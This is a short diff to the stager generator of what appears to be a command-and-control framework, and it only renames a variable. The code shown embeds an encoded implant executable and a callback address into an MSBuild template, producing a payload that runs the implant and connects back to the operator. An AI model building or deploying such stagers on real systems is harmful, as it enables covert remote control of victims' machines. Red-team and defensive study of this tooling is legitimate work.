@@ -13,12 +13,12 @@ class STStager(Stager):
         self.options = {}
 
     def generate(self, listener):
-        with open('./core/teamserver/data/naga.exe', 'rb') as dll:
+        with open('./core/teamserver/data/naga.exe', 'rb') as assembly:
             with open('./core/teamserver/stagers/templates/msbuild.xml') as template:
                 template = template.read()
                 template = template.replace('C2_URL', f"{listener.name}://{listener['BindIP']}:{listener['Port']}")
                 template = template.replace("NAME_GOES_HERE", gen_random_string_no_digits(5))
-                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(dll.read()))
+                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(assembly.read()))
                 return template
 
                 #print_good(f"Generated stager to {stager.name}")
